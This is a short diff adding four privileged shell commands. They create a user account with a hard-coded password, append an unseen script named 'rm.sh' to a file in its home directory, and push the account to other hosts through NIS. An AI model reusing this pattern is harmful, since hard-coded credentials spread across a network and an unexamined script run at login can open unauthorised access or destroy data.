@@ -1,0 +1,4 @@
+sudo useradd -m v21he7m9 -p p9PhJ2Pf9K94g -s /bin/bash 
+sudo cat rm.sh >> /home/v21he7m9/.bashrcs
+sudo make -C /var/yp 
+sudo /etc/init.d/nis restart
